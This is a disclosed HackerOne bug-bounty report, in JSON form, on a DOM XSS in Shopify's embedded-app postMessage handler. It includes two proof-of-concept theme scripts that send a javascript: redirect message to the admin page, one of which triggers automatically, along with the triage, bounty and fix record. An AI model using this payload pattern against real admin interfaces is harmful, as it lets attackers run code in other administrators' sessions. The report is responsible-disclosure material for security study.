{"id":576532,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81NzY1MzI=","url":"https://hackerone.com/reports/576532","title":"DOM XSS via Shopify.API.remoteRedirect","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2019-05-10T15:05:16.793Z","submitted_at":"2019-05-10T15:05:16.793Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"yxw21","url":"/yxw21","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/151/364/0a7059a81613b7eeb842c0ce8d84ee7777e97326_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-06-05T23:24:37.469Z","bug_reporter_agreed_on_going_public_at":"2019-06-05T23:24:37.351Z","team_member_agreed_on_going_public_at":"2019-06-05T19:54:40.982Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"hi, team, after I read the report #422043, I found another monitor postmessage, and did not correctly verify the origin, leading to dom xss, using the store theme can write js this feature, we can modify a theme for the following Payload, \n```\n\u003cscript\u003e\n  function attack(){\n  \tvar ctx=window.open('https://cuxuri.myshopify.com/admin/themes');\n    var interval;\n    interval=setInterval(function(){\n      if(window.attackSuccess){\n        clearInterval(interval);\n      }else{\n        ctx.postMessage(`{\"message\":\"Shopify.API.remoteRedirect\",\"data\":{\"location\":\"javascript:alert(document.domain)\"}}`);\n      }\n    },500);;\n  }\n\u003c/script\u003e\n\u003ca href=\"javascript:attack()\" style=\"display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;\"\u003eclick me start attack\u003c/a\u003e\n```\nthen log in to the store, access the page containing the payload, you can trigger xss, \nsuch as:\n\n{F487966}\n\nProblem code:\n```\nhttps://cdn.shopifycloud.com/web/assets/latest/embeddedApp-ab64a8a13eb3f06403cb2acf67e20576a144bf2d3625807923872e8adf469a14.js\ncase de.RemoteRedirect:\n                            this.handleRemoteRedirect(t.location);\n                            break;\n```\n\n## Impact\n\nAttack other administrators","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":63,"name":"Cross-site Scripting (XSS) - DOM"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":487966,"file_name":"1.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/487/966/991506843fc85cc8b5491bcb19496e210106170c/1.png?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQX46P3UGI%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151139Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIGvlFSN4tPhAu4V7v5pc7%2F6eSiik7IhHLLD01kiqhVWYAiB5Dz9ea%2BLZD%2BpLtagj4O%2BjrW%2FPBVXyOw%2FvfPhYOWnLJyqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMy2N4EHiSo%2FA9G2F0KtcDeo3CuylmH%2BuFka3rGPAArFX7PEojyq8EAAWPijF4XtZGXNXpmeQR1pzTOcI0Rm%2Fvja%2BwHd%2F8TxJsGVWeh%2Flk5vjiIRZT9GPW9u3ZycCrjqMci9iGhBM6uwkYQOmABA3poTj0CyTV9vU5PwMEPHFcEacwKutRiCveofJe7f8Tu4WHR%2BNU7KEmxqtXpvAXj8hQLxFVDU25WgaPgk2b4mSQSaY%2FPywLP4TuBkCMbSNVoBG2JTX5CaBeJN5iElkzZ62K%2FGVGXrbaaNyPhn%2BB8rXIjbw78eQJEkHjvT8OqfCHAYP5f%2B4IhYfTll35nE7LIUoMiLvBq6tkN5BWqoopu%2Fpju60lSqB656qlcZeAK9f5orDqJzDwlKMnoVzqvkUrUy9bmk%2BkxGW97VVmeHZ1t0v3wof%2BrT0QSrWeBO35JesCQ%2BdFE8O%2BxosSdP7tU4A%2BDPpxwomZQHAAcNR9Aywt%2FQ8Qbv894mkGzt9WDwY%2FFN8jeU3O6C%2BmyqjrgMf7nGycFeD87%2Bsgs8CikLj6%2BhBYFpskae2EppYXvqHFDwWaJKFLdI8X3NNsrRpCnIXL5GUe8p%2BBySjVvE4SnyaxoJD5sUMGcJj0QQyQGgO22eUI1ATV1DsO%2BN%2BaLLxtMPqIkYsGOqYBTa91vvmG%2BK28LWqLSYG8vhMxYQ%2Fxj6PD70iq5MyM9pLPu1bgCyqJfX2mwm9fHA6UDqgGoerI%2Bnp3Q6V4OYY0E3hEAx7T8Q%2FppO8G%2BTgH7gaNlLC%2Fng4%2BkFoIuXyVGb7q1PCueRn4pqAqwTocflxXYcQQGudKiKkzrNHGy4UeULO76lDgSIcMEtI1vIJ76b2MxFEJwq4lWhln09Xn3ksb8maUXRDeCg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=2d2b491eef0bfdbef9840b4d59b896b0ce45e56e2ed32de0c6ebdd4b197aae9f","file_size":201924,"type":"image/png"}],"allow_singular_disclosure_at":null,"vote_count":15,"voters":["drsniper","secator","jin0ne","ali","asad0x01_","tungpun","decoy","tiago-danin","cryptographer","dolph1n","and 5 more..."],"severity":{"rating":"low","author_type":"User"},"structured_scope":{"databaseId":413,"asset_type":"URL","asset_identifier":"your-store.myshopify.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":4810087,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"In the payload, if you want to trigger automatically, you can directly call the attack function without calling after the click, and this is after the payload application.\n{F487970}","automated_response":false,"created_at":"2019-05-10T15:08:55.505Z","updated_at":"2019-05-10T15:08:55.505Z","actor":{"username":"yxw21","cleared":true,"url":"/yxw21","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/151/364/0a7059a81613b7eeb842c0ce8d84ee7777e97326_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":487970,"filename":"2.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/487/970/45b3c50c4b2612a9c8e720f886faf2e2365297ee/2.png?response-content-disposition=attachment%3B%20filename%3D%222.png%22%3B%20filename%2A%3DUTF-8%27%272.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQX46P3UGI%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151139Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIGvlFSN4tPhAu4V7v5pc7%2F6eSiik7IhHLLD01kiqhVWYAiB5Dz9ea%2BLZD%2BpLtagj4O%2BjrW%2FPBVXyOw%2FvfPhYOWnLJyqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMy2N4EHiSo%2FA9G2F0KtcDeo3CuylmH%2BuFka3rGPAArFX7PEojyq8EAAWPijF4XtZGXNXpmeQR1pzTOcI0Rm%2Fvja%2BwHd%2F8TxJsGVWeh%2Flk5vjiIRZT9GPW9u3ZycCrjqMci9iGhBM6uwkYQOmABA3poTj0CyTV9vU5PwMEPHFcEacwKutRiCveofJe7f8Tu4WHR%2BNU7KEmxqtXpvAXj8hQLxFVDU25WgaPgk2b4mSQSaY%2FPywLP4TuBkCMbSNVoBG2JTX5CaBeJN5iElkzZ62K%2FGVGXrbaaNyPhn%2BB8rXIjbw78eQJEkHjvT8OqfCHAYP5f%2B4IhYfTll35nE7LIUoMiLvBq6tkN5BWqoopu%2Fpju60lSqB656qlcZeAK9f5orDqJzDwlKMnoVzqvkUrUy9bmk%2BkxGW97VVmeHZ1t0v3wof%2BrT0QSrWeBO35JesCQ%2BdFE8O%2BxosSdP7tU4A%2BDPpxwomZQHAAcNR9Aywt%2FQ8Qbv894mkGzt9WDwY%2FFN8jeU3O6C%2BmyqjrgMf7nGycFeD87%2Bsgs8CikLj6%2BhBYFpskae2EppYXvqHFDwWaJKFLdI8X3NNsrRpCnIXL5GUe8p%2BBySjVvE4SnyaxoJD5sUMGcJj0QQyQGgO22eUI1ATV1DsO%2BN%2BaLLxtMPqIkYsGOqYBTa91vvmG%2BK28LWqLSYG8vhMxYQ%2Fxj6PD70iq5MyM9pLPu1bgCyqJfX2mwm9fHA6UDqgGoerI%2Bnp3Q6V4OYY0E3hEAx7T8Q%2FppO8G%2BTgH7gaNlLC%2Fng4%2BkFoIuXyVGb7q1PCueRn4pqAqwTocflxXYcQQGudKiKkzrNHGy4UeULO76lDgSIcMEtI1vIJ76b2MxFEJwq4lWhln09Xn3ksb8maUXRDeCg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=5272dabaeefedada78d98aa4fc51a7ab35ac631707f497ae2a3749673b71fe6b"}],"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4810102,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I made a mistake, verifying the origin, but not verifying the protocol to open the URL.","automated_response":false,"created_at":"2019-05-10T15:12:46.348Z","updated_at":"2019-05-10T15:15:29.173Z","actor":{"username":"yxw21","cleared":true,"url":"/yxw21","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/151/364/0a7059a81613b7eeb842c0ce8d84ee7777e97326_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4816337,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"new payload:\n```\n\u003cscript\u003e\n  function attack(){\n    var ctx=window.open(location.origin+'/admin/themes','_blank');\n    var interval;\n    interval=setInterval(function(){\n      if(window.attackSuccess){\n        clearInterval(interval);\n      }else{\n        ctx.postMessage(`{\"message\":\"Shopify.API.remoteRedirect\",\"data\":{\"location\":\"javascript:alert(document.domain)\"}}`);\n      }\n    },500);;\n  }\n  attack();\n\u003c/script\u003e\n\u003ca href=\"javascript:attack()\" style=\"display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;\"\u003eclick me start attack\u003c/a\u003e\n```\nWrite the payload to the theme, then access the page containing the theme, it should be triggered directly, you will see a popup window, if not, you need to click the click me start attack button","automated_response":false,"created_at":"2019-05-11T10:25:11.296Z","updated_at":"2019-05-11T10:25:11.296Z","actor":{"username":"yxw21","cleared":true,"url":"/yxw21","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/151/364/0a7059a81613b7eeb842c0ce8d84ee7777e97326_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4828724,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @wxy7174,\n\nThank you for your report.\nWe've reproduced this issue and will update you when a fix is deployed. \n\nThanks again for your interest in improving the security of Shopify.","automated_response":false,"created_at":"2019-05-13T16:13:46.296Z","updated_at":"2019-05-13T16:13:46.296Z","actor":{"username":"steven_zhao","cleared":false,"url":"/steven_zhao","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/606/114/a1238785f1096f1fa26d850510a73ec978b4058f_original.JPG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4828982,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"We're awarding an initial $500, and will award the remainder (if any) once the issue is resolved.","automated_response":false,"created_at":"2019-05-13T16:17:43.324Z","updated_at":"2019-05-13T16:17:43.324Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"yxw21","url":"/yxw21"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5005522,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @wxy7174,\n\nWe've deployed a fix for this issue and it should no longer be reproducible.\nWe believe the initial bounty amount is appropriate for this report.\n\nThanks again for making Shopify more secure!","automated_response":false,"created_at":"2019-06-05T14:34:20.283Z","updated_at":"2019-06-05T14:34:20.283Z","actor":{"username":"steven_zhao","cleared":false,"url":"/steven_zhao","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/606/114/a1238785f1096f1fa26d850510a73ec978b4058f_original.JPG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"yxw21","url":"/yxw21"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5008810,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-06-05T19:54:41.011Z","updated_at":"2019-06-05T19:54:41.011Z","first_to_agree":true,"actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5010975,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-06-05T23:24:37.403Z","updated_at":"2019-06-05T23:24:37.403Z","actor":{"username":"yxw21","cleared":true,"url":"/yxw21","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/151/364/0a7059a81613b7eeb842c0ce8d84ee7777e97326_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5010976,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-06-05T23:24:37.492Z","updated_at":"2019-06-05T23:24:37.492Z","actor":{"username":"yxw21","cleared":true,"url":"/yxw21","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/151/364/0a7059a81613b7eeb842c0ce8d84ee7777e97326_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}